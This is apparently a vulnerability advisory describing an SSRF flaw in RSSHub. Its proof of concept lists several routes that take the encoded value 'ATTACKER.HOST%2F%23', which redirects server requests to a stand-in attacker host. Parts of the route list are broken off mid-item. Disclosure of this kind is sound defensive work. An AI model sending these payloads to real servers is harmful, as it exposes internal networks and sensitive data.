title: "RSSHub SSRF vulnerability"
description: "## Summary\n\nRSSHub is vulnerable to Server-Side Request Forgery (SSRF)
  attacks. This vulnerability allows an attacker to send arbitrary HTTP requests from
  the server to other servers or resources on the network.\n\n## Description\n\nAn
  attacker can exploit this vulnerability by sending a request to the affected routes
  with a malicious URL. For example, if an attacker controls the `ATTACKER.HOST` domain,
  they can send a request to affected routes with the value set to `ATTACKER.HOST%2F%23`.\nThe
  `%2F` and `%23` characters are URL-encoded versions of the forward-slash (`/`) and
  pound (`#`) characters, respectively. In this context, an attacker could use those
  characters to append the base URL (i.e. `https://${input}.defined.host`) to be modified
  to `https://ATTACKER.HOST/#.defined.host`. This will cause the server to send a
  request to the attacker-controlled domain, allowing the attacker to potentially
  gain access to sensitive information or perform further attacks on the server. \n\n##
  Proof of Concept\n\nThe following routes are affected by this vulnerability:\n\n-
  /19lou/ATTACKER.HOST%2F%23/foo\n- /bandisoft/1/ATTACKER.HOST%2F%23\n- /bendibao/news/ATTACKER.HOST%2F%23\n-
  /bitbucket/commits/.* _(special treatment, set the `BITBUCKET_USERNAME` environment
  value to `ATTACKER.HOST%2F%23`)_\n- /blogs/hedwig/ATTACKER.HOST%2F%23\n- /booth.pm/shop/ATTACKER.HOST%2F%23\n-

  should end with `id`)_\n- /people/ATTACKER.HOST%2F%23\n- /pornhub/ATTACKER.HOST%2F%23/category_url/foo\n-

  Impact\n\nAn attacker could use this vulnerability to send requests to internal
  or any other servers or resources on the network, potentially gain access to sensitive
  information that would not normally be accessible and amplifying the impact of the
  attack."
